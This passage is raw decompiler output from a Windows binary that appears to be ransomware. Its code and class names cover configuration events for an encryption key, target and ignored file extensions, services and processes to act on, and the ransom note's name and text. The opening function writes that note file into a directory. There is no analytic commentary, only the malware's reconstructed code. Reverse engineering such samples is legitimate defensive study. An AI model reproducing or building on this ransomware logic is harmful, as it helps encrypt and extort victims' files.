  LPCWSTR lpFileName[4]; // [esp+18h] [ebp-5Ch] BYREF
  __int64 v22; // [esp+28h] [ebp-4Ch]
  void *Block[4]; // [esp+30h] [ebp-44h] BYREF
  __int64 v24; // [esp+40h] [ebp-34h]
  int v25[4]; // [esp+48h] [ebp-2Ch]
  int v26[2]; // [esp+58h] [ebp-1Ch]
  DWORD NumberOfBytesWritten; // [esp+60h] [ebp-14h] BYREF
  int v28; // [esp+70h] [ebp-4h]

  v2 = sub_4124A0(a2);
  v26[0] = 0;
  v26[1] = 7;
  v3 = (unsigned __int16 *)(v2 + 16);
  LOWORD(v25[0]) = 0;
  v28 = 0;
  v4 = *(_DWORD *)(v2 + 32);
  if ( !v4 )
    goto LABEL_10;
  v5 = (unsigned __int16 *)(v2 + 16);
  if ( *(_DWORD *)(v2 + 36) >= 8u )
    v5 = *(unsigned __int16 **)v3;
  v6 = sub_40A9C0(v5, v4, (int)v5, (__int16 *)"\\", 1);
  if ( v6 == -1 )
  {
LABEL_10:
    v9 = *(_QWORD *)v26;
    v8 = *(_OWORD *)v25;
  }
  else
  {
    v7 = v6 + 1;
    v22 = 0x700000000i64;
    LOWORD(lpFileName[0]) = 0;
    if ( v4 < v7 )
      v7 = v4;
    if ( *((_DWORD *)v3 + 5) >= 8u )
      v3 = *(unsigned __int16 **)v3;
    sub_404330(lpFileName, v3, v7);
    v8 = *(_OWORD *)lpFileName;
    v9 = v22;
    *(_OWORD *)v25 = *(_OWORD *)lpFileName;
    *(_QWORD *)v26 = v22;
  }
  *(_OWORD *)Block = v8;
  v24 = v9;
  v28 = 1;
  if ( v26[0] )
  {
    v10 = this + 57;
    v11 = this + 51;
    LOBYTE(v28) = 2;
    v12 = v26[0] + this[55];
    v22 = 0x700000000i64;
    LOWORD(lpFileName[0]) = 0;
    sub_40AF10(lpFileName, v12);
    v13 = Block;
    if ( v26[1] >= 8u )
      v13 = (void **)v25[0];
    sub_4044A0(lpFileName, v13, v26[0]);
    if ( this[56] >= 8 )
      v11 = (_DWORD *)*v11;
    sub_4044A0(lpFileName, v11, this[55]);
    if ( (_DWORD)v22 && this[61] )
    {
      v14 = (const WCHAR *)lpFileName;
      if ( HIDWORD(v22) >= 8 )
        v14 = lpFileName[0];
      FileW = CreateFileW(v14, 0x40000000u, 0, 0, 2u, 0x80u, 0);
      if ( FileW != (HANDLE)-1 )
      {
        v16 = this[62] < 0x10;
        v17 = this[61];
        NumberOfBytesWritten = 0;
        if ( !v16 )
          v10 = (_DWORD *)*v10;
        WriteFile(FileW, v10, v17, &NumberOfBytesWritten, 0);
        CloseHandle(FileW);
      }
    }
    if ( HIDWORD(v22) >= 8 )
    {
      v18 = (WCHAR *)lpFileName[0];
      if ( (unsigned int)(2 * HIDWORD(v22) + 2) >= 0x1000 )
      {
        v18 = (WCHAR *)*((_DWORD *)lpFileName[0] - 1);
        if ( (unsigned int)((char *)lpFileName[0] - (char *)v18 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_44775B(v18);
    }
  }
  if ( HIDWORD(v24) >= 8 )
  {
    v19 = Block[0];
    if ( (unsigned int)(2 * HIDWORD(v24) + 2) >= 0x1000 )
    {
      v19 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v19 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v19);
  }
}

//----- (00411EE0) --------------------------------------------------------
void **__thiscall sub_411EE0(void **this, void *a2)
{
  void **v2; // esi
  void **result; // eax
  size_t v4; // ecx

  v2 = this + 24;
  result = (void **)(sub_4125C0(a2) + 16);
  if ( result != v2 )
  {
    v4 = (size_t)v2[4];
    if ( (unsigned int)v2[5] >= 0x10 )
      v2 = (void **)*v2;
    return sub_40A390(result, v2, v4);
  }
  return result;
}

//----- (00411F10) --------------------------------------------------------
_DWORD *__thiscall sub_411F10(_DWORD *this, void *a2)
{
  _DWORD *v2; // esi
  _DWORD *result; // eax
  unsigned int v4; // ecx

  v2 = this + 8;
  result = (_DWORD *)(sub_412640(a2) + 16);
  if ( result != v2 )
  {
    v4 = v2[4];
    if ( v2[5] >= 8u )
      v2 = (_DWORD *)*v2;
    return sub_404330(result, v2, v4);
  }
  return result;
}

//----- (00411F40) --------------------------------------------------------
void __thiscall sub_411F40(unsigned int **this, void *a2)
{
  unsigned int **v2; // esi
  unsigned int **v3; // eax
  int v4; // [esp+4h] [ebp-4h]

  v2 = this + 30;
  v3 = (unsigned int **)(sub_4126C0(a2) + 16);
  if ( v3 != v2 )
    sub_412F10(v3, *v2, v2[1], v4);
}
// 411F63: variable 'v4' is possibly undefined

//----- (00411F70) --------------------------------------------------------
void __thiscall sub_411F70(unsigned int **this, void *a2)
{
  unsigned int **v2; // esi
  unsigned int **v3; // eax
  int v4; // [esp+4h] [ebp-4h]

  v2 = this + 33;
  v3 = (unsigned int **)(sub_412740(a2) + 16);
  if ( v3 != v2 )
    sub_412F10(v3, *v2, v2[1], v4);
}
// 411F96: variable 'v4' is possibly undefined

//----- (00411FB0) --------------------------------------------------------
void __thiscall sub_411FB0(unsigned int **this, void *a2)
{
  unsigned int **v2; // esi
  unsigned int **v3; // eax
  int v4; // [esp+4h] [ebp-4h]

  v2 = this + 36;
  v3 = (unsigned int **)(sub_4127C0(a2) + 16);
  if ( v3 != v2 )
    sub_412F10(v3, *v2, v2[1], v4);
}
// 411FD6: variable 'v4' is possibly undefined

//----- (00411FF0) --------------------------------------------------------
void __thiscall sub_411FF0(unsigned int **this, void *a2)
{
  unsigned int **v2; // esi
  unsigned int **v3; // eax
  int v4; // [esp+4h] [ebp-4h]

  v2 = this + 39;
  v3 = (unsigned int **)(sub_412840(a2) + 16);
  if ( v3 != v2 )
    sub_412F10(v3, *v2, v2[1], v4);
}
// 412016: variable 'v4' is possibly undefined

//----- (00412030) --------------------------------------------------------
int __thiscall sub_412030(_DWORD *this, void *a2)
{
  int result; // eax

  result = sub_4128C0(a2);
  *(_DWORD *)(result + 16) = this[48];
  return result;
}

//----- (00412050) --------------------------------------------------------
int __thiscall sub_412050(_DWORD *this, void *a2)
{
  int result; // eax

  result = sub_412940(a2);
  *(_DWORD *)(result + 16) = this[49];
  return result;
}

//----- (00412070) --------------------------------------------------------
__int64 __thiscall sub_412070(_DWORD *this, void *a2)
{
  __int64 result; // rax

  LODWORD(result) = sub_4129C0(a2);
  HIDWORD(result) = this[50] == 0;
  *(_DWORD *)(result + 16) = HIDWORD(result);
  return result;
}

//----- (004120A0) --------------------------------------------------------
void **__thiscall sub_4120A0(void **this, void *a2)
{
  void **v2; // esi
  void **result; // eax
  size_t v4; // ecx

  v2 = this + 42;
  result = (void **)(sub_412A40(a2) + 16);
  if ( result != v2 )
  {
    v4 = (size_t)v2[4];
    if ( (unsigned int)v2[5] >= 0x10 )
      v2 = (void **)*v2;
    return sub_40A390(result, v2, v4);
  }
  return result;
}

//----- (004120E0) --------------------------------------------------------
_DWORD *__thiscall sub_4120E0(_DWORD *this, void *a2)
{
  _DWORD *v2; // esi
  _DWORD *result; // eax
  unsigned int v4; // ecx

  v2 = this + 51;
  result = (_DWORD *)(sub_412AC0(a2) + 16);
  if ( result != v2 )
  {
    v4 = v2[4];
    if ( v2[5] >= 8u )
      v2 = (_DWORD *)*v2;
    return sub_404330(result, v2, v4);
  }
  return result;
}

//----- (00412120) --------------------------------------------------------
void **__thiscall sub_412120(void **this, void *a2)
{
  void **v2; // esi
  void **result; // eax
  size_t v4; // ecx

  v2 = this + 57;
  result = (void **)(sub_412B40(a2) + 16);
  if ( result != v2 )
  {
    v4 = (size_t)v2[4];
    if ( (unsigned int)v2[5] >= 0x10 )
      v2 = (void **)*v2;
    return sub_40A390(result, v2, v4);
  }
  return result;
}

//----- (00412160) --------------------------------------------------------
unsigned int **__thiscall sub_412160(unsigned int **this, unsigned int **a2)
{
  int v4; // [esp+4h] [ebp-4h]

  if ( this != a2 )
    sub_412F10(this, *a2, a2[1], v4);
  return this;
}
// 412176: variable 'v4' is possibly undefined

//----- (00412190) --------------------------------------------------------
void **__thiscall sub_412190(void **this, void **a2)
{
  void *v2; // eax

  v2 = a2;
  if ( this != a2 )
  {
    if ( (unsigned int)a2[5] >= 8 )
      v2 = *a2;
    sub_404330(this, v2, (unsigned int)a2[4]);
  }
  return this;
}

//----- (004121C0) --------------------------------------------------------
char *__thiscall sub_4121C0(unsigned int *this, unsigned int a2)
{
  unsigned int v3; // esi
  void *v4; // eax
  void *v5; // ecx
  unsigned int v6; // eax
  char *result; // eax
  char *v8; // eax

  if ( a2 > 0xAAAAAAA )
    goto LABEL_9;
  v3 = 24 * a2;
  if ( 24 * a2 < 0x1000 )
  {
    if ( v3 )
    {
      v8 = (char *)operator new(24 * a2);
      *this = (unsigned int)v8;
      this[1] = (unsigned int)v8;
      result = &v8[v3];
      this[2] = (unsigned int)result;
    }
    else
    {
      *this = 0;
      this[1] = 0;
      result = 0;
      this[2] = 0;
    }
    return result;
  }
  if ( v3 + 35 <= v3 )
LABEL_9:
    sub_403CC0();
  v4 = operator new(v3 + 35);
  v5 = v4;
  if ( !v4 )
    _invalid_parameter_noinfo_noreturn();
  v6 = ((unsigned int)v4 + 35) & 0xFFFFFFE0;
  *(_DWORD *)(v6 - 4) = v5;
  *this = v6;
  this[1] = v6;
  result = (char *)(v3 + v6);
  this[2] = (unsigned int)result;
  return result;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);

//----- (00412250) --------------------------------------------------------
const void **__thiscall sub_412250(_DWORD *Src, unsigned int a2, unsigned int a3, char *Srca, size_t Size)
{
  unsigned int v5; // edx
  unsigned int v7; // esi
  _DWORD *v8; // edx
  unsigned int v10; // eax
  _DWORD *v11; // edx
  char *v12; // esi
  char *v13; // edx
  size_t v14; // esi
  unsigned int v15; // [esp+Ch] [ebp-18h]
  int v16; // [esp+10h] [ebp-14h]
  unsigned int v17; // [esp+18h] [ebp-Ch]
  char *v18; // [esp+18h] [ebp-Ch]
  unsigned int v19; // [esp+1Ch] [ebp-8h]
  char *v20; // [esp+20h] [ebp-4h]

  v5 = a3;
  v7 = Src[4];
  if ( v7 < a2 )
    sub_404630();
  if ( v7 - a2 < a3 )
    v5 = v7 - a2;
  v17 = v5;
  if ( v5 == Size )
  {
    v8 = Src;
    if ( Src[5] >= 0x10u )
      v8 = (_DWORD *)*Src;
    memmove_0((char *)v8 + a2, Srca, Size);
    return (const void **)Src;
  }
  else
  {
    v16 = v7 - v5 - a2 + 1;
    v19 = Size - v5;
    if ( Size >= v5 )
    {
      v15 = Src[5];
      if ( v19 > v15 - v7 )
      {
        return sub_412C60((const void **)Src, v19, v15, a2, v5, Srca, Size);
      }
      else
      {
        v18 = (char *)Src;
        Src[4] = v7 + v19;
        if ( v15 >= 0x10 )
          v18 = (char *)*Src;
        v20 = &v18[a2];
        v13 = &v18[a2 + v5];
        if ( &Srca[Size] <= &v18[a2] || Srca > &v18[v7] )
        {
          v14 = Size;
        }
        else if ( v13 > Srca )
        {
          v14 = v13 - Srca;
        }
        else
        {
          v14 = 0;
        }
        memmove_0(&v13[v19], v13, v16);
        memmove_0(v20, Srca, v14);
        memmove(&v20[v14], &Srca[v14 + v19], Size - v14);
        return (const void **)Src;
      }
    }
    else
    {
      v10 = v7 + Size - v5;
      v11 = Src;
      Src[4] = v10;
      if ( Src[5] >= 0x10u )
        v11 = (_DWORD *)*Src;
      v12 = (char *)v11 + a2;
      memmove_0((char *)v11 + a2, Srca, Size);
      memmove_0(&v12[Size], &v12[v17], v16);
      return (const void **)Src;
    }
  }
}
// 404630: using guessed type void __noreturn sub_404630(void);

//----- (004123C0) --------------------------------------------------------
void *__thiscall sub_4123C0(void *this, int a2)
{
  int v4[2]; // [esp+8h] [ebp-28h] BYREF
  char v5; // [esp+10h] [ebp-20h]
  int v6; // [esp+14h] [ebp-1Ch]
  int *v7; // [esp+2Ch] [ebp-4h]

  v4[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANConfigModule::*)(ANIEvent &&),ANConfigModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v4[1] = *(_DWORD *)a2;
  v5 = *(_BYTE *)(a2 + 4);
  v6 = *(_DWORD *)(a2 + 8);
  v7 = v4;
  sub_412DF0(v4, (int)this);
  if ( v7 )
    (*(void (__stdcall **)(bool))(*v7 + 16))(v7 != v4);
  return this;
}
// 4B1524: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANConfigModule::*)(ANIEvent &&),ANConfigModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (00412420) --------------------------------------------------------
int __thiscall sub_412420(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventPutToNote `RTTI Type Descriptor', 1);
}

//----- (004124A0) --------------------------------------------------------
int __thiscall sub_4124A0(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventDropNote `RTTI Type Descriptor', 1);
}

//----- (00412520) --------------------------------------------------------
_DWORD *__fastcall sub_412520(_DWORD *Src, _DWORD *a2, unsigned int *a3)
{
  _DWORD *v3; // ebx
  unsigned int *v5; // esi
  unsigned int v6; // eax

  v3 = a2;
  Src[4] = 0;
  Src[5] = 7;
  *(_WORD *)Src = 0;
  v5 = a3;
  sub_40AF10(Src, a2[4] + a3[4]);
  v6 = v3[4];
  if ( v3[5] >= 8u )
    v3 = (_DWORD *)*v3;
  sub_4044A0(Src, v3, v6);
  if ( a3[5] >= 8 )
    v5 = (unsigned int *)*a3;
  sub_4044A0(Src, v5, a3[4]);
  return Src;
}

//----- (004125C0) --------------------------------------------------------
int __thiscall sub_4125C0(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventGetPublicKey `RTTI Type Descriptor', 1);
}

//----- (00412640) --------------------------------------------------------
int __thiscall sub_412640(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventGetExtension `RTTI Type Descriptor', 1);
}

//----- (004126C0) --------------------------------------------------------
int __thiscall sub_4126C0(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast(
           (int)this,
           0,
           &ANIEvent `RTTI Type Descriptor',
           &ANEventGetEncryptExtensionsIgnore `RTTI Type Descriptor',
           1);
}

//----- (00412740) --------------------------------------------------------
int __thiscall sub_412740(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast(
           (int)this,
           0,
           &ANIEvent `RTTI Type Descriptor',
           &ANEventGetEncryptExtensionsFull `RTTI Type Descriptor',
           1);
}

//----- (004127C0) --------------------------------------------------------
int __thiscall sub_4127C0(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventGetServices `RTTI Type Descriptor', 1);
}

//----- (00412840) --------------------------------------------------------
int __thiscall sub_412840(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventGetProcesses `RTTI Type Descriptor', 1);
}

//----- (004128C0) --------------------------------------------------------
int __thiscall sub_4128C0(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventGetInterval `RTTI Type Descriptor', 1);
}

//----- (00412940) --------------------------------------------------------
int __thiscall sub_412940(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventGetLid `RTTI Type Descriptor', 1);
}

//----- (004129C0) --------------------------------------------------------
int __thiscall sub_4129C0(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventGetBuildType `RTTI Type Descriptor', 1);
}

//----- (00412A40) --------------------------------------------------------
int __thiscall sub_412A40(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventGetEncKey `RTTI Type Descriptor', 1);
}

//----- (00412AC0) --------------------------------------------------------
int __thiscall sub_412AC0(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventGetNoteName `RTTI Type Descriptor', 1);
}

//----- (00412B40) --------------------------------------------------------
int __thiscall sub_412B40(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventGetNoteText `RTTI Type Descriptor', 1);
}

//----- (00412BC0) --------------------------------------------------------
_DWORD *__stdcall sub_412BC0(_DWORD *Src, _DWORD *a2, _DWORD *a3)
{
  _DWORD *i; // esi

  for ( i = Src; i != a2; i += 6 )
  {
    sub_4055B0(a3, i);
    a3 += 6;
  }
  sub_4047B0((int)a3, (int)a3);
  return a3;
}

//----- (00412C60) --------------------------------------------------------
const void **__thiscall sub_412C60(
        const void **Src,
        unsigned int a2,
        int a3,
        size_t Size,
        int a5,
        const void *a6,
        size_t a7)
{
  size_t v8; // edx
  unsigned int v9; // edi
  unsigned int v10; // esi
  unsigned int v11; // ecx
  void *v12; // eax
  _DWORD *v13; // edi
  _DWORD *v14; // eax
  char *v15; // esi
  unsigned int v17; // [esp+14h] [ebp-Ch]
  void *v18; // [esp+18h] [ebp-8h]
  char *v19; // [esp+18h] [ebp-8h]
  size_t v20; // [esp+1Ch] [ebp-4h]
  size_t v21; // [esp+1Ch] [ebp-4h]

  v8 = (size_t)Src[4];
  v20 = v8;
  if ( 0x7FFFFFFF - v8 < a2 )
    sub_404900();
  v9 = (unsigned int)Src[5];
  v18 = (void *)(v8 + a2);
  v10 = (v8 + a2) | 0xF;
  v17 = v9;
  if ( v10 <= 0x7FFFFFFF )
  {
    if ( v9 <= 0x7FFFFFFF - (v9 >> 1) )
    {
      if ( v10 < v9 + (v9 >> 1) )
        v10 = v9 + (v9 >> 1);
    }
    else
    {
      v10 = 0x7FFFFFFF;
    }
  }
  else
  {
    v10 = 0x7FFFFFFF;
  }
  v11 = __CFADD__(v10, 1) ? -1 : v10 + 1;
  if ( v11 < 0x1000 )
  {
    if ( v11 )
    {
      v14 = operator new(__CFADD__(v10, 1) ? -1 : v10 + 1);
      v8 = v20;
      v13 = v14;
    }
    else
    {
      v13 = 0;
    }
  }
  else
  {
    if ( v11 + 35 <= v11 )
      sub_403CC0();
    v12 = operator new(v11 + 35);
    if ( !v12 )
      goto LABEL_23;
    v8 = v20;
    v13 = (_DWORD *)(((unsigned int)v12 + 35) & 0xFFFFFFE0);
    *(v13 - 1) = v12;
  }
  Src[4] = v18;
  Src[5] = (const void *)v10;
  v21 = v8 - Size - a5 + 1;
  v19 = (char *)v13 + Size + a7;
  if ( v17 >= 0x10 )
  {
    v15 = (char *)*Src;
    memmove(v13, *Src, Size);
    memmove((char *)v13 + Size, a6, a7);
    memmove(v19, &v15[Size + a5], v21);
    if ( v17 + 1 < 0x1000 )
    {
LABEL_19:
      sub_44775B(v15);
      *Src = v13;
      return Src;
    }
    if ( (unsigned int)&v15[-*((_DWORD *)v15 - 1) - 4] <= 0x1F )
    {
      v15 = (char *)*((_DWORD *)v15 - 1);
      goto LABEL_19;
    }
LABEL_23:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v13, Src, Size);
  memmove((char *)v13 + Size, a6, a7);
  memmove(v19, (char *)Src + Size + a5, v21);
  *Src = v13;
  return Src;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (00412DF0) --------------------------------------------------------
void __thiscall sub_412DF0(_DWORD *this, int a2)
{
  int v3; // edx
  int v4; // eax
  char *v5; // ecx
  int v6; // eax
  _DWORD *v7; // ebx
  int v8; // edx
  int v9; // ecx
  int v10; // eax
  char *v11; // ecx
  char v12[36]; // [esp+10h] [ebp-34h] BYREF
  char *v13; // [esp+34h] [ebp-10h]

  v3 = this[9];
  if ( (_DWORD *)v3 != this )
  {
    v4 = *(_DWORD *)(a2 + 36);
    if ( v4 != a2 )
    {
      this[9] = v4;
      *(_DWORD *)(a2 + 36) = v3;
      return;
    }
  }
  v5 = 0;
  v13 = 0;
  if ( v3 )
  {
    if ( (_DWORD *)v3 == this )
    {
      v6 = (*(int (__thiscall **)(int, char *))(*(_DWORD *)v3 + 4))(v3, v12);
      v7 = (_DWORD *)this[9];
      v5 = (char *)v6;
      v13 = (char *)v6;
      if ( !v7 )
        goto LABEL_10;
      (*(void (__thiscall **)(_DWORD *, bool))(*v7 + 16))(v7, v7 != this);
      v5 = v13;
    }
    else
    {
      v5 = (char *)v3;
      v13 = (char *)v3;
    }
    this[9] = 0;
  }
LABEL_10:
  v8 = *(_DWORD *)(a2 + 36);
  if ( !v8 )
    goto LABEL_17;
  if ( v8 == a2 )
  {
    this[9] = (*(int (__thiscall **)(_DWORD, _DWORD *))(*(_DWORD *)v8 + 4))(*(_DWORD *)(a2 + 36), this);
    v9 = *(_DWORD *)(a2 + 36);
    if ( !v9 )
    {
      v5 = v13;
      goto LABEL_17;
    }
    (*(void (__stdcall **)(bool))(*(_DWORD *)v9 + 16))(v9 != a2);
    v5 = v13;
  }
  else
  {
    this[9] = v8;
  }
  *(_DWORD *)(a2 + 36) = 0;
LABEL_17:
  if ( v5 )
  {
    if ( v5 == v12 )
    {
      v10 = (*(int (__thiscall **)(char *, int))(*(_DWORD *)v5 + 4))(v5, a2);
      v11 = v13;
      *(_DWORD *)(a2 + 36) = v10;
      if ( v11 )
        (*(void (__stdcall **)(bool))(*(_DWORD *)v11 + 16))(v11 != v12);
    }
    else
    {
      *(_DWORD *)(a2 + 36) = v5;
    }
  }
}

//----- (00412F10) --------------------------------------------------------
void __thiscall sub_412F10(unsigned int **this, unsigned int *a2, unsigned int *a3, int a4)
{
  unsigned int *v5; // ebx
  unsigned int v6; // esi
  unsigned int v7; // ecx
  unsigned int v8; // edx
  int v9; // eax
  unsigned int *v10; // ebx
  unsigned int v11; // eax
  unsigned int *v12; // esi
  int v13; // esi
  unsigned int v14; // [esp+Ch] [ebp-Ch]

  v5 = *this;
  v6 = ((char *)a3 - (char *)a2) / 24;
  v14 = ((char *)this[1] - (char *)*this) / 24;
  if ( v6 <= v14 )
  {
    v13 = (int)&v5[6 * v6];
    sub_413100(a2, a3, v5);
    sub_4047B0(v13, (int)this[1]);
    this[1] = (unsigned int *)v13;
  }
  else
  {
    v7 = ((char *)this[2] - (char *)v5) / 24;
    if ( v6 <= ((char *)this[2] - (char *)v5) / 24 )
    {
      v11 = v14;
    }
    else
    {
      if ( v6 > 0xAAAAAAA )
        sub_404860();
      v8 = v7 >> 1;
      if ( v7 <= 178956970 - (v7 >> 1) )
      {
        v9 = v8 + v7;
        if ( v8 + v7 < v6 )
          v9 = ((char *)a3 - (char *)a2) / 24;
        v6 = v9;
      }
      if ( v5 )
      {
        sub_4047B0((int)v5, (int)this[1]);
        v10 = *this;
        if ( (unsigned int)(24 * (((char *)this[2] - (char *)*this) / 24)) >= 0x1000 )
        {
          if ( (unsigned int)v10 - *(v10 - 1) - 4 > 0x1F )
            _invalid_parameter_noinfo_noreturn();
          v10 = (unsigned int *)*(v10 - 1);
        }
        sub_44775B(v10);
        *this = 0;
        this[1] = 0;
        this[2] = 0;
      }
      sub_4121C0((unsigned int *)this, v6);
      v5 = *this;
      v11 = 0;
    }
    v12 = &a2[6 * v11];
    sub_413100(a2, v12, v5);
    this[1] = sub_412BC0(v12, a3, this[1]);
  }
}
// 404860: using guessed type void __noreturn sub_404860(void);

//----- (00413090) --------------------------------------------------------
void __thiscall sub_413090(void *Block, char a2)
{
  if ( a2 )
    sub_44775B(Block);
}

//----- (004130B0) --------------------------------------------------------
void ***sub_4130B0()
{
  return &std::_Binder<std::_Unforced,void (__thiscall ANConfigModule::*)(ANIEvent &&),ANConfigModule *,std::_Ph<1> const &> `RTTI Type Descriptor';
}
// 4FE0B0: using guessed type void **std::_Binder<std::_Unforced,void (__thiscall ANConfigModule::*)(ANIEvent &&),ANConfigModule *,std::_Ph<1> const &> `RTTI Type Descriptor';

//----- (004130C0) --------------------------------------------------------
int __thiscall sub_4130C0(int this)
{
  return (*(int (__thiscall **)(_DWORD))(this + 4))(*(_DWORD *)(this + 12));
}

//----- (004130D0) --------------------------------------------------------
int __thiscall sub_4130D0(int this, int a2)
{
  int result; // eax

  result = a2;
  *(_DWORD *)a2 = &std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANConfigModule::*)(ANIEvent &&),ANConfigModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_DWORD *)(a2 + 12) = *(_DWORD *)(this + 12);
  return result;
}
// 4B1524: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANConfigModule::*)(ANIEvent &&),ANConfigModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (00413100) --------------------------------------------------------
unsigned int *__fastcall sub_413100(unsigned int *a1, unsigned int *a2, unsigned int *a3)
{
  unsigned int *v4; // esi
  unsigned int *v5; // edi
  unsigned int *v6; // eax

  v4 = a1;
  if ( a1 == a2 )
    return a3;
  v5 = a3;
  do
  {
    if ( v5 != v4 )
    {
      v6 = v4;
      if ( v4[5] >= 8 )
        v6 = (unsigned int *)*v4;
      sub_404330(v5, v6, v4[4]);
    }
    v4 += 6;
    v5 += 6;
  }
  while ( v4 != a2 );
  return v5;
}

//----- (00413160) --------------------------------------------------------
_DWORD *__thiscall sub_413160(_DWORD *Block, char a2)
{
  *Block = &ANIEvent::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';

//----- (00413190) --------------------------------------------------------
_DWORD *__thiscall sub_413190(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  this[1] = 0;
  *((_WORD *)this + 8) = 0;
  result = this;
  this[2] = 2;
  this[3] = 11;
  *this = &ANEventGetExtension::`vftable';
  this[8] = 0;
  this[9] = 7;
  return result;
}
// 4B15A4: using guessed type void *ANEventGetExtension::`vftable';

//----- (004131D0) --------------------------------------------------------
int __thiscall sub_4131D0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  *this = &ANEventGetExtension::`vftable';
  v2 = this[9];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[4];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  result = 0;
  this[8] = 0;
  this[9] = 7;
  *((_WORD *)this + 8) = 0;
  *this = &ANIEvent::`vftable';
  return result;
}
// 4B15A4: using guessed type void *ANEventGetExtension::`vftable';
// 4B15AC: using guessed type void *ANIEvent::`vftable';

//----- (00413240) --------------------------------------------------------
_DWORD *__thiscall sub_413240(_DWORD *Block, char a2)
{
  sub_4131D0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00413270) --------------------------------------------------------
int __thiscall sub_413270(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  *this = &ANEventSmartScan::`vftable';
  v2 = this[9];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[4];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  result = 0;
  this[8] = 0;
  this[9] = 7;
  *((_WORD *)this + 8) = 0;
  *this = &ANIEvent::`vftable';
  return result;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B15C8: using guessed type void *ANEventSmartScan::`vftable';

//----- (004132E0) --------------------------------------------------------
_DWORD *__thiscall sub_4132E0(_DWORD *Block, char a2)
{
  sub_413270(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00413310) --------------------------------------------------------
